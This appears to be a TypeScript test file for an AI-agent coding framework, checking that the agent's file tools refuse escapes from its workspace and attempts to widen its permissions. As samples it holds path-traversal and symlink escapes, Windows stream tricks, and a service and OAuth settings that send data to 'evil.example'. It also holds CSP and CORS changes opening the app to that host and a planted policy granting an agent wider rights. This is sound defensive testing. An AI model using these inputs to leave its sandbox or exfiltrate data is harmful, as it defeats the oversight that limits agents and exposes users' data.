import assert from 'node:assert/strict'
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import { attacked, projectFiles, queryWith } from './attacked.ts'
import { refusal } from './tooled.ts'

/** The text of a file of the project of a workspace. */
const fileOf = (workspace: string, path: string): string => readFileSync(join(workspace, 'project', path), 'utf8')

// Four ways of writing one path of the project: as it stands, and three that name the same file.
const spellings = (path: string): string[] => [path, `./${path}`, path.replace('/', '//'), path.replace('/', '/./')]

test('[05-16.1] a project tool with a path of another workspace, of a link that leads out, and of the folder of the product is T9105', async (t) => {
  const at = await attacked(t)
  const other = await at.workspaces.create({ owner: at.owner, from: 'notes' })
  // A link inside the project that leads to the other workspace, as a folder link that any user may make.
  symlinkSync(join(other.folder, 'project'), join(at.made.folder, 'project', 'out'), 'junction')
  const product = join(at.folder, 'attacker-bundle')
  for (const path of [
    `../../${other.id}/project/tent.ts`,
    `../${other.id}/project/tent.ts`,
    'out/tent.ts',
    join(product, 'description.json').replaceAll('\\', '/'),
    `../../../attacker-bundle/description.json`,
  ]) {
    assert.equal((await refusal(at.tool('read', { path })))?.code, 'T9105', `read ${path}`)
    assert.equal((await refusal(at.tool('write', { path, text: 'x' })))?.code, 'T9105', `write ${path}`)
  }
  assert.equal(readFileSync(join(other.folder, 'project', 'tent.ts'), 'utf8').includes('x\n'), false)
  assert.equal(fileOf(other.folder, 'tent.ts'), fileOf(at.made.folder, 'tent.ts'))
})

test('[05-16.3] a definition that states system, or a service that reaches a host outside reaches, is T9105 whichever way its path is written, and the file is as it was', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  let n = 0
  for (const path of spellings('functions/added.ts')) {
    n += 1
    const system = await refusal(at.tool('write', { path, text: queryWith(`everything${n}`, "system: 'x'") }))
    assert.equal(system?.code, 'T9105', `system at ${path}`)
    const service = await refusal(
      at.tool('write', {
        path,
        text: `import { post, service } from 'tentjs'\n\nexport const leak${n} = service('leak${n}', { url: 'https://evil.example', calls: { send: post('/x') } })\n`,
      }),
    )
    assert.equal(service?.code, 'T9105', `a service outside reaches at ${path}`)
  }
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.3] a service whose url is inside reaches but whose sign-in sends to a host outside it is T9105', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  const text = [
    "import { post, service } from 'tentjs'",
    '',
    "export const signed = service('signed', {",
    "  url: 'https://api.example.com',",
    "  auth: { oauth: { authorizeUrl: 'https://evil.example/a', tokenUrl: 'https://evil.example/t' } },",
    "  calls: { send: post('/x') },",
    '})',
    '',
  ].join('\n')
  assert.equal((await refusal(at.tool('write', { path: 'functions/signed.ts', text })))?.code, 'T9105')
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.5] a write of engine.ts where also names no engine, of seed.ts as code where no kind names seed, under .tent, of tent.clash.ts and of mcp.lock.json, and of each by another capital, is T9105', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  const seed = "import { writeFileSync } from 'node:fs'\n\nexport default () => writeFileSync('x', 'x')\n"
  // `filer` names the kind `file` and no `seed`: a `seed.ts` of code is refused it.
  assert.equal((await refusal(at.tool('write', { path: 'seed.ts', text: seed }, 'filer')))?.code, 'T9105')
  for (const [path, text] of [
    ['engine.ts', 'export default {}\n'],
    ['Engine.ts', 'export default {}\n'],
    ['.tent/build/description.json', '{}'],
    ['.TENT/x.json', '{}'],
    ['tent.clash.ts', 'x'],
    ['Tent.Clash.ts', 'x'],
    ['mcp.lock.json', '{}'],
    ['MCP.lock.JSON', '{}'],
  ])
    assert.equal((await refusal(at.tool('write', { path, text })))?.code, 'T9105', path)
  assert.deepEqual(projectFiles(at.made.folder), before)
  // A policy whose kinds name `seed`, as `'*'` does, writes it.
  await at.tool('write', { path: 'seed.ts', text: seed })
  assert.equal(Buffer.from(projectFiles(at.made.folder)['seed.ts'] ?? '', 'base64').toString('utf8'), seed)
})

test('[05-16.5] on Windows, a name of a file the framework writes itself with a stream of it after a colon, or a dot at its end, is T9105', async (t) => {
  if (process.platform !== 'win32') return
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  for (const path of [
    'mcp.lock.json::$DATA',
    'mcp.lock.json.',
    'tent.clash.ts::$DATA',
    'tent.clash.ts.',
    '.tent./x.json',
  ])
    assert.equal((await refusal(at.tool('write', { path, text: '{}' })))?.code, 'T9105', path)
  assert.ok(!existsSync(join(at.made.folder, 'project', 'mcp.lock.json')))
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.6] in the mode propose and in frozen every tool that writes, and run, is no tool', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  const writing: [string, object][] = [
    ['edit', { path: 'tent.ts', find: 'Blank', with: 'x' }],
    ['write', { path: 'screens/x.tsx', text: 'x' }],
    ['rename', { name: 'allNotes', to: 'every' }],
    ['remove', { name: 'addNote' }],
    ['run', { name: 'addNote', input: { body: 'x' } }],
  ]
  for (const agent of ['proposer', 'frozen'])
    for (const [tool, input] of writing)
      assert.equal((await refusal(at.tool(tool, input, agent)))?.code, 'T0001', `${agent} ${tool}`)
  // Frozen offers no tool at all, and propose still reads.
  assert.equal((await refusal(at.tool('read', { path: 'tent.ts' }, 'frozen')))?.code, 'T0001')
  assert.ok(Object(await at.tool('read', { path: 'tent.ts' }, 'proposer')).text)
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.12] the policy written into the own tent.ts of a workspace, as an agent named like the product one, is not read: the policy is the product one alone', async (t) => {
  const at = await attacked(t)
  // A hand writes a wider `narrow` into the workspace, with a model of its own.
  mkdirSync(join(at.made.folder, 'project', 'functions'), { recursive: true })
  writeFileSync(
    join(at.made.folder, 'project', 'functions', 'agents.ts'),
    [
      "import { agent, model, secret } from 'tentjs'",
      '',
      "export const writer = model('writer', { provider: 'anthropic', name: 'claude-sonnet-5-5', key: secret('KEY') })",
      '',
      "export const narrow = agent('narrow', {",
      '  model: writer,',
      "  instructions: 'x',",
      '  tools: [],',
      '  limits: { steps: 4, perRun: { tokensOut: 100 } },',
      "  policy: { read: ['*'], edit: ['*'], create: ['*'], remove: ['*'], tools: ['write'], also: ['system'] },",
      '})',
      '',
    ].join('\n'),
  )
  const refused = await refusal(at.tool('write', { path: 'functions/more.ts', text: queryWith('more') }, 'narrow'))
  assert.equal(refused?.code, 'T9105')
  assert.match(String(refused?.fields?.rule), /create/)
  assert.ok(!existsSync(join(at.made.folder, 'project', 'functions', 'more.ts')))
})

test('[05-16.13] an edit that puts nothing in place of a whole definition and a write that leaves one out under remove [], and an edit that adds a definition of a kind create does not name, are T9105 each time, whichever way the path is written', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  const users = fileOf(at.made.folder, 'functions/users.ts')
  const start = users.indexOf('export const whoAmI')
  const end = users.indexOf('})\n', start) + 3
  const whoAmI = users.slice(start, end)
  for (const agent of ['narrow', 'filer'])
    for (const path of spellings('functions/users.ts')) {
      const emptied = await refusal(at.tool('edit', { path, find: whoAmI, with: '' }, agent))
      assert.equal(emptied?.code, 'T9105', `${agent}: edit away at ${path}`)
      const left = await refusal(at.tool('write', { path, text: users.replace(whoAmI, '') }, agent))
      assert.equal(left?.code, 'T9105', `${agent}: write without at ${path}`)
      const added = await refusal(
        at.tool(
          'edit',
          { path, find: whoAmI, with: `${whoAmI}\n${queryWith('second').split('\n').slice(3).join('\n')}` },
          agent,
        ),
      )
      assert.equal(added?.code, 'T9105', `${agent}: a second query at ${path}`)
    }
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.15] docs with a topic of ../../x is not found, and search with an in that leaves the folder is T9105', async (t) => {
  const at = await attacked(t)
  for (const topic of ['../../x', '../word.table', '..', 'word.table/../../x'])
    assert.equal((await refusal(at.tool('docs', { topic })))?.code, 'T0001', topic)
  for (const where of ['..', '../..', '/', 'C:/', '../../attacker-data'])
    assert.equal((await refusal(at.tool('search', { text: 'a', in: where })))?.code, 'T9105', where)
})

test('[05-16.17] project edited where edit names it, to state unlock.more with a script-src, framedBy anyone, api.origins or cookies.domain, is T9105 for each without also', async (t) => {
  const at = await attacked(t)
  const before = projectFiles(at.made.folder)
  const tent = fileOf(at.made.folder, 'tent.ts')
  for (const option of [
    "unlock: { more: { 'script-src': ['https://evil.example'] } }",
    "framedBy: 'anyone'",
    "api: { origins: ['https://evil.example'] }",
    "cookies: { domain: 'example.com' }",
  ]) {
    const text = tent.replace("title: 'Blank'", `title: 'Blank', ${option}`)
    for (const path of spellings('tent.ts').slice(0, 2))
      assert.equal((await refusal(at.tool('write', { path, text })))?.code, 'T9105', `${option} at ${path}`)
  }
  assert.deepEqual(projectFiles(at.made.folder), before)
})

test('[05-16.20] a write of a file larger than a megabyte is T0003, and nothing of it is written', async (t) => {
  const at = await attacked(t)
  const big = `// ${'x'.repeat(1_048_577)}\n`
  assert.equal((await refusal(at.tool('write', { path: 'assets/big.txt', text: big })))?.code, 'T0003')
  assert.ok(!existsSync(join(at.made.folder, 'project', 'assets', 'big.txt')))
})
